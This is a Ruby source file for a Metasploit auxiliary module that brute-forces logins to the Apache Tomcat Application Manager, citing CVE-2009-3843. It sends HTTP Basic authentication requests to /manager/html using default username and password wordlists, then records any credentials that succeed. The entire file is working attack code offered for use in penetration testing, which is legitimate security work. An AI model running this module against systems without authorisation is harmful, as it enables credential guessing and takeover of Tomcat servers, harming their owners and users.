##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Tomcat Application Manager Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.',
			'References'  =>
				[
					[ 'CVE', '2009-3843' ],
					[ 'URL', 'http://tomcat.apache.org/' ]
				],
			'Author'         => [ 'MC', 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8180),
				OptBool.new('VERBOSE', [ true, 'Verbose output', false]),
				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_users.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_pass.txt") ]),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
	end

	def run_host(ip)
		each_user_pass { |user, pass|
			do_login(user, pass, datastore['VERBOSE'])
		}
	end

	def do_login(user='tomcat', pass='tomcat', verbose=false)

		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose
		success = false
		srvhdr = '?'
		user_pass = Rex::Text.encode_base64(user + ":" + pass)

		begin
			res = send_request_cgi({
				'uri'     => "/manager/html",
				'method'  => 'GET',
				'headers' =>
					{
						'Authorization' => "Basic #{user_pass}",
					}
				}, 25)

			srvhdr = res.headers['Server']
			success = true if (res.code == 200)

		rescue ::Rex::ConnectionError
			print_error("http://#{rhost}:#{rport}/manager/html Unable to attempt authentication") if verbose
			return :done
		end

		if success
			print_good("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto  => 'tomcat',
				:user   => user,
				:pass   => pass,
				:targ_host => rhost,
				:targ_port => rport
			)
			return :next_user
		else
			print_error("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'") if verbose
			return
		end
	end
end
